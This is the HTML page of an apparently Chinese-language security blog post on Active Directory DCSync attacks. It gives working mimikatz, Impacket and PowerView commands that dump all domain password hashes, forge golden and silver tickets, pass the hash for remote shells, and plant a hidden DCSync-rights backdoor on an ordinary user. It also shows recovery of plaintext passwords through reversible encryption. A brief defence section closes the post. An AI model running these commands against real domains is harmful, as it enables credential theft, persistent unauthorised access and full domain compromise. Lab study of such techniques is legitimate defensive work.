@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:lzz]">
+<meta name="description" content="Dcsync简介 在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。
+新版本的 Mimikatz新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。
+当获得了域内管理员权限，如果能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希，这样可以做一个隐蔽的权限维持。
+默认只有域控主机账号和域管理员能Dcsync，域管和邮件服务器的机器账号有写ACL的权限，可以给指定用户添加Dcsync来dump域哈希。
+域对象只需要具备一下这两个权限，就有dcsync的权限
+‘DS-Replication-Get-Changes’ = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 ‘DS-Replication-Get-Changes-All’ = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 利用条件  域控本地管理组用户（administrators，Domain Admins，Enterprise Admins的组内用户）    域控制器的计算机用户
+  拿下exchange服务器后可以WriteACL赋予指定用户或域机器DCSync权限
+  利用方式： 拥有上述条件的任意用户权限，即可导出域内任意用户的hash
+mimikatz 导出administrator用户的Hash
+域内
+lsadump::dcsync /domain:hiro.com /user:administrator 
+域外
+lsadump::dcsync /domain:xx /dc:xx /user:krbtgt /authuser:dc02$ /authdomain:xx /authpassword:&amp;quot;&amp;quot; /authntlm
+域控导出所有域用户的哈希
+privilege::debug lsadump::dcsync /domain:hiro.com /all /csv 其他机器读取域内密码hash" />
+<meta name="keywords" content="homepage, blog, science, informatics, development, programming, AD" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://lzzbb.github.io/posts/2021/01/dcsync/" />
+
+
+    <title>
+        
+            Dcsync :: lzzzzzzz 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://lzzbb.github.io/main.2461b42f711aae674dd78e353275891fa072d7bf2ea9fbd577297a99dde78461.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://lzzbb.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://lzzbb.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://lzzbb.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://lzzbb.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://lzzbb.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://lzzbb.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Dcsync">
+<meta itemprop="description" content="Dcsync简介 在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。
+新版本的 Mimikatz新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。
+当获得了域内管理员权限，如果能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希，这样可以做一个隐蔽的权限维持。
+默认只有域控主机账号和域管理员能Dcsync，域管和邮件服务器的机器账号有写ACL的权限，可以给指定用户添加Dcsync来dump域哈希。
+域对象只需要具备一下这两个权限，就有dcsync的权限
+‘DS-Replication-Get-Changes’ = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 ‘DS-Replication-Get-Changes-All’ = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 利用条件  域控本地管理组用户（administrators，Domain Admins，Enterprise Admins的组内用户）    域控制器的计算机用户
+  拿下exchange服务器后可以WriteACL赋予指定用户或域机器DCSync权限
+  利用方式： 拥有上述条件的任意用户权限，即可导出域内任意用户的hash
+mimikatz 导出administrator用户的Hash
+域内
+lsadump::dcsync /domain:hiro.com /user:administrator 
+域外
+lsadump::dcsync /domain:xx /dc:xx /user:krbtgt /authuser:dc02$ /authdomain:xx /authpassword:&quot;&quot; /authntlm
+域控导出所有域用户的哈希
+privilege::debug lsadump::dcsync /domain:hiro.com /all /csv 其他机器读取域内密码hash"><meta itemprop="datePublished" content="2021-01-02T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-05-20T21:46:30+08:00" />
+<meta itemprop="wordCount" content="270"><meta itemprop="image" content="https://lzzbb.github.io/"/>
+<meta itemprop="keywords" content="AD," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lzzbb.github.io/"/>
+
+<meta name="twitter:title" content="Dcsync"/>
+<meta name="twitter:description" content="Dcsync简介 在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。
+新版本的 Mimikatz新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。
+当获得了域内管理员权限，如果能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希，这样可以做一个隐蔽的权限维持。
+默认只有域控主机账号和域管理员能Dcsync，域管和邮件服务器的机器账号有写ACL的权限，可以给指定用户添加Dcsync来dump域哈希。
+域对象只需要具备一下这两个权限，就有dcsync的权限
+‘DS-Replication-Get-Changes’ = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 ‘DS-Replication-Get-Changes-All’ = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 利用条件  域控本地管理组用户（administrators，Domain Admins，Enterprise Admins的组内用户）    域控制器的计算机用户
+  拿下exchange服务器后可以WriteACL赋予指定用户或域机器DCSync权限
+  利用方式： 拥有上述条件的任意用户权限，即可导出域内任意用户的hash
+mimikatz 导出administrator用户的Hash
+域内
+lsadump::dcsync /domain:hiro.com /user:administrator 
+域外
+lsadump::dcsync /domain:xx /dc:xx /user:krbtgt /authuser:dc02$ /authdomain:xx /authpassword:&quot;&quot; /authntlm
+域控导出所有域用户的哈希
+privilege::debug lsadump::dcsync /domain:hiro.com /all /csv 其他机器读取域内密码hash"/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-01-02 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://lzzbb.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://lzzbb.github.io/posts">Posts</a></li><li><a href="https://lzzbb.github.io/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        2 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://lzzbb.github.io/posts/2021/01/dcsync/">Dcsync</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h2 id="dcsync简介">Dcsync简介</h2>
+<p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p>
+<p>新版本的 Mimikatz新增加了 DCSync 功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。</p>
+<p>当获得了域内管理员权限，如果能修改域内普通用户的权限，使其具有DCSync权限的话，那么普通域用户也能导出域内用户的哈希，这样可以做一个隐蔽的权限维持。</p>
+<p><code>默认只有域控主机账号和域管理员能Dcsync，域管和邮件服务器的机器账号有写ACL的权限，可以给指定用户添加Dcsync来dump域哈希。</code></p>
+<p>域对象只需要具备一下这两个权限，就有dcsync的权限</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">‘DS-Replication-Get-Changes’     = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+</span></span><span class="line"><span class="cl">‘DS-Replication-Get-Changes-All’ = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/1.png" alt=""></p>
+<h3 id="利用条件">利用条件</h3>
+<ol>
+<li>域控本地管理组用户（administrators，Domain Admins，Enterprise Admins的组内用户）</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/2.jpg" alt=""></p>
+<ol>
+<li>
+<p>域控制器的计算机用户</p>
+</li>
+<li>
+<p>拿下exchange服务器后可以WriteACL赋予指定用户或域机器DCSync权限</p>
+</li>
+</ol>
+<h3 id="利用方式">利用方式：</h3>
+<p>拥有上述条件的任意用户权限，即可导出域内任意用户的hash</p>
+<h3 id="mimikatz">mimikatz</h3>
+<p>导出administrator用户的Hash</p>
+<p>域内</p>
+<p><code>lsadump::dcsync /domain:hiro.com /user:administrator </code></p>
+<p>域外</p>
+<p><code>lsadump::dcsync /domain:xx /dc:xx /user:krbtgt /authuser:dc02$ /authdomain:xx /authpassword:&quot;&quot; /authntlm</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/3.jpg" alt=""></p>
+<p>域控导出所有域用户的哈希</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:hiro.com /all /csv
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/4.jpg" alt=""></p>
+<p>其他机器读取域内密码hash</p>
+<p><code>lsadump::dcsync /domain:redteam.lab /dc:dc1.redteam.lab /user:administrator /authuser:dc1$ /authdomain:redteam.lab /authpassword:&quot;&quot; /authntlm</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/5.png" alt=""></p>
+<h3 id="后门利用">后门利用</h3>
+<p>DCsync是几个权限的集合体，如果使其具有DCSync权限的话，可以向域内普通用户添加如下三条ACE(Access Control Entries)：</p>
+<p>使用Empire下的powerview.ps1脚本执行以上三条ACE</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">DS-Replication-Get-Changes—&gt;(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
+</span></span><span class="line"><span class="cl">DS-Replication-Get-Changes-All—&gt;(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
+</span></span><span class="line"><span class="cl">DS-Replication-Get-Changes—&gt;(GUID:89e95b76-444d-4c62-991a-0facbeda640c)
+</span></span></code></pre></div><p>在域管用户上给域用户win7添加以上两条ACE</p>
+<p><code>Add-DomainObjectAcl -TargetIdentity “DC=hiro,DC=com” -PrincipalIdentity win7 -Rights DCSync -Verbose</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/6.jpg" alt=""></p>
+<p>当用户win7具有DCSync权限后，可以导出域内哈希：</p>
+<p><code>python3 secretsdump.py hiro.com/win7:123456QWE.@192.168.228.10 -dc-ip 192.168.228.10</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/7.jpg" alt=""></p>
+<p>给域用户win7删除以上三条ACE</p>
+<p><code>Remove-DomainObjectAcl -TargetIdentity “DC=hiro,DC=com” -PrincipalIdentity win7 -Rights DCSync -Verbose</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/8.jpg" alt=""></p>
+<p>域用户win7失去了DCSync，同样也无法导出域内hash了</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/9.jpg" alt=""></p>
+<h2 id="使用黄金票据dcsync导出域内所有用户的hash">使用黄金票据+DCSync导出域内所有用户的Hash</h2>
+<h3 id="生成黄金票据">生成黄金票据：</h3>
+<p>得到krbtgt用户hash</p>
+<p><code>lsadump::dcsync /domain:hiro.com /user:krbtgt</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/10.jpg" alt=""></p>
+<p>导入黄金票据</p>
+<p><code>kerberos::golden /user:administrator /domain:hiro.com /sid:S-1-5-21-1909134247-741334235-3019370817 /krbtgt:5f468f6d7ac43c327396d832a0241d81 /ptt </code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/11.jpg" alt=""></p>
+<h3 id="导出域hash">导出域hash</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">kerberos::list 
+</span></span></code></pre></div><p>导出所有用户的哈希</p>
+<p><code>lsadump::dcsync /domain:hiro.com /all /csv</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/12.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/13.jpg" alt=""></p>
+<h3 id="哈希传递">哈希传递</h3>
+<p><code>python3 .\wmiexec.py hiro/administrator@192.168.228.10 -hashes aad3b435b51404eeaad3b435b51404ee:e9bf196dc93a1219e3b2e79b1b7aa36e</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/14.jpg" alt=""></p>
+<h2 id="dcsync可逆加密存储密码">Dcsync+可逆加密存储密码</h2>
+<p>Active Directory 帐户有一项遗留功能，称为“可逆加密”。通常，使用 NT单向函数对用户密码进行散列以创建 NTLM hash。NTLM hash无法逆转，必须破解。</p>
+<p>如果启用了可逆加密，则用户的密码将使用加密存储，这意味着可以将加密的数据还原回用户的密码。使用可逆加密存储的密码不是散列，因为可以调用函数来恢复原始明文密码。</p>
+<hr>
+<p>帐户启用可逆加密，帐户的明文密码不会立即可用；如果对帐户启用了可逆加密并且用户在设置此配置后更改了密码，则明文密码将保存在 Active Directory 数据库中。当用户再次调用Dcsync后会显示其明文。</p>
+<hr>
+<p>勾选“可逆加密存储密码”这个属性后，用户再次更改密码会显示其明文密码；将administrator设置为可逆加密存储密码</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/15.jpg" alt=""></p>
+<p>使用ldap条件勾选其使用可逆加密存储属性的帐户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">get-adobject -ldapfilter “(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=128))”
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">Set-ADUser marry -AllowReversiblePasswordEncryption $true
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/16.jpg" alt=""></p>
+<p>更改administrator密码，dcsync就能显示其明文密码</p>
+<p><code>python3 secretsdump.py redteam.lab/administrator:Qq123456..@192.168.129.130 -dc-ip 192.168.129.130 -just-dc-user administrator</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/17.jpg" alt=""></p>
+<h2 id="使用machineaccount实现dcsync">使用MachineAccount实现DCSync</h2>
+<p>MachineAccount是每台计算机在安装系统后默认生成的计算机帐户</p>
+<p>如果计算机加入域中，会将计算机帐户的密码同步到域控制器并保存在域控制器的NTDS.dit文件中</p>
+<p>计算机帐户的密码默认每30天自动更新，密码长度为120个字符，所以说，即使获得了计算机帐户密码的hash，也很难还原出计算机帐户的明文口令</p>
+<h3 id="关闭域内计算机帐户密码自动更新的两种方法适用于域内主机">关闭域内计算机帐户密码自动更新的两种方法（适用于域内主机）</h3>
+<ol>
+<li>修改组策略</li>
+</ol>
+<p>选择Default Domain Policy</p>
+<p><code>Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/18.png" alt=""></p>
+<ol>
+<li>修改组策略的配置文件</li>
+</ol>
+<p>Default Domain Policy对应的guid为31B2F340-016D-11D2-945F-00C04FB984F9</p>
+<p>配置文件路径为：</p>
+<p><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit</code></p>
+<p>修改文件GptTmpl.inf，在[Registry Values]下添加新的内容：</p>
+<p><code>MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange=4,1</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/19.png" alt=""></p>
+<p>配置完成，将系统时间调快30天，hash保持不变</p>
+<h2 id="获得machineaccount-hash的方法">获得MachineAccount hash的方法</h2>
+<h3 id="1通过本地sam文件中读取密码哈希">1.通过本地SAM文件中读取密码哈希</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mimikatz命令示例：
+</span></span><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">token::elevate
+</span></span><span class="line"><span class="cl">lsadump::secrets
+</span></span></code></pre></div><p>返回的结果中，$machine.ACC项对应计算机帐户，如下图</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/20.png" alt=""></p>
+<h3 id="2使用dcsync导出所有帐户的hash">2.使用DCSync导出所有帐户的hash</h3>
+<p>(1)使用mimikatz</p>
+<p>在域控制器上使用mimikatz导出域内所有用户的hash</p>
+<p><code>mimikatz.exe “lsadump::dcsync /domain:test.com /all /csv” exit</code></p>
+<p>(2)使用 secretsdump.py</p>
+<p><code>python3 secretsdump.py test/Administrator:DomainAdmin123!@192.168.1.1</code></p>
+<p>secretsdump.py的实现原理：</p>
+<p>使用计算机帐户hash通过smbexec或者wmiexec远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的hash，同时通过Dcsync或从NTDS.dit文件中导出所有域用户的hash。</p>
+<h3 id="3通过cve-2020-1472">3.通过CVE-2020-1472</h3>
+<p>CVE-2020-1472能够在未授权的状态下远程修改DC计算机帐户的口令hash</p>
+<p>像服务器一样，DC拥有一个带有密码的机器帐户，该帐户以加密方式存储在注册表中。引导时将其加载到lsass中。如果使用Zerologon更改密码，则仅AD中NTDS密码会更改，而不是注册表或lsass中的密码。利用后每当发出新的Kerberos票证时，DC无法使用lsass中的机器帐户密码来解密服务票证，并且无法使用Kerberos中断身份验证。</p>
+<h2 id="使用machineaccount实现dcsync-1">使用MachineAccount实现DCSync</h2>
+<p>例如，获得了域控制器DC1的计算机帐户hash为7da530fba3b15a2ea21ce7db8110d57b</p>
+<h3 id="1使用mimikatz">1.使用mimikatz</h3>
+<p>这里需要制作白银票据(Silver Ticket)，接着获得LDAP服务的访问权限</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mimikatz “kerberos::golden /domain:test.com /sid:S-1-5-21-254706111-4049838133-2416586677 /target:DC1.test.com /service:LDAP /rc4:7da530fba3b15a2ea21ce7db8110d57b /user:krbtgt /ptt” “lsadump::dcsync /domain:test.com /all /csv” exit
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/sid表示域的sid，
+</span></span><span class="line"><span class="cl">/rc4表示计算机帐户的NTLM hash
+</span></span><span class="line"><span class="cl">/user:krbtgt表示伪造成用户krbtgt，生成票据
+</span></span></code></pre></div><h3 id="2使用secretsdump">2.使用secretsdump</h3>
+<p><code>python2 secretsdump.py -hashes :e411580b657837aee7aaadb6e2a4449b redteam/DC1$@192.168.129.130 -just-dc-user krbtgt</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dcsync/21.png" alt=""></p>
+<p>注意：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.secretsdump支持从域外的计算机连接到域控
+</span></span><span class="line"><span class="cl">2.如果使用域内普通计算机帐户的hash连接对应的计算机，会提示rpc_s_access_denied
+</span></span></code></pre></div><p>也可以通过 wmiexec.py 或smbexec.py远程执行cmd命令 （<code>server2016已经不能用机器账户进行认证登陆</code>）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">python smbexec.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1 whoami /priv
+</span></span><span class="line"><span class="cl">python wmiexec.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1 whoami /priv
+</span></span></code></pre></div><h3 id="防御">防御</h3>
+<p>1.通过网络监控检测来自白名单以外的域控制器数据同步复制。</p>
+<p>2.给域控设置白名单，只允许白名单内的域控IP发起数据同步请求。</p>
+<p>3.利用AD自检工具查看哪些域用户有Dcsync的权限。</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://lzzbb.github.io/tags/ad/">AD</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        270 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-01-02 08:00 &#43;0800
+        
+
+         
+          
+            
+              (Last updated: 2022-05-20 21:46 &#43;0800)
+            
+          
+        
+      </p>
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit">
+            <circle cx="12" cy="12" r="4"></circle>
+            <line x1="1.05" y1="12" x2="7" y2="12"></line>
+            <line x1="17.01" y1="12" x2="22.96" y2="12"></line>
+          </svg>
+
+          <a href="https://github.com/coolbluemelvin/mlvn.io/commit/0b81056c455f426f87d0c9280966d549475e967f" target="_blank" rel="noopener">0b81056</a>
+          @ 2022-05-20
+        </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://lzzbb.github.io/posts/2021/04/kerberos%E5%88%A9%E7%94%A8%E9%9D%A2/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">kerberos利用面</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://lzzbb.github.io/posts/2020/09/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7/">
+                    <span class="button__text">定位域控</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://lzzbb.github.io/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js" integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l&#43;qxcnN3UWK6NyURtxH&#43;ovdgjyFuaKZ7si1g=="></script>
+
+
+
+    </body>
+</html>
